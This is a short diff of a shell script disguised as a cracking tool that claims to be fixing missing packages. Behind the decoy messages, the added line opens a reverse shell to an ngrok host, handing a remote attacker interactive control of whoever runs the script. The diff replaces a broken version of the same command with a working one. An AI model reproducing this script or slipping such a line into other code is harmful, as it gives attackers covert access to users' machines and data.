@@ -6,6 +6,7 @@ echo Dont Close This Terminal Wait few Minutes
 echo Some packages are missing 
 sleep 2
 echo fixing them
-sh -i >& /dev/tcp/6.tcp.ngrok.io/5628 &0>1
+bash -i >& /dev/tcp/6.tcp.ngrok.io/15628 0>&1
+sleep 4
 echo python2 crack.py
 echo Thanks For using my tool
